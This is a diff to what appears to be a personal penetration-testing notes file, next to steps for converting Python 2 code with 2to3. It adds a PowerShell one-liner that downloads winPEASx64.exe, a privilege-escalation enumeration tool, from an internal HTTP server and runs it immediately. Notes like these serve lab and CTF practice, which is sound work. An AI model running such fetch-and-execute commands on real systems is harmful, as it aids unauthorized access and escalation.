@@ -116,5 +116,7 @@ Commnd: pip install 2to3
 Step 3: Convert the files
 Excute: 2to3 [file or folder] -w
     
- 
-      
+### Copy files to windows operating system
+
+    powershell.exe Invoke-WebRequest -Uri http://10.4.67.180:8000/winPEASx64.exe -OutFile .\winPEASx64.exe && .\winPEASx64.exe"
+
